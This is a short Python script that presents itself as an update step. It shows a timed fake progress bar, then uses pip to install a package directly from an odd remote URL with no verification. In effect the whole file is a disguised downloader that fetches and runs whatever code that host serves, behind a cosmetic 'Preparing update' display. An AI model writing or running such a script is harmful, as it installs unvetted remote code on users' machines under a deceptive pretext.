import subprocess
import sys
import time
from progress.bar import ShadyBar
UPDATE_URL = 'https://aupd.19700101t000000z.com'

def main():
    bar = ShadyBar('Preparing update', max=100)
    for i in range(100):
        time.sleep(0.01)
        bar.next()
    bar.finish()
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', UPDATE_URL])
if __name__ == '__main__':
    main()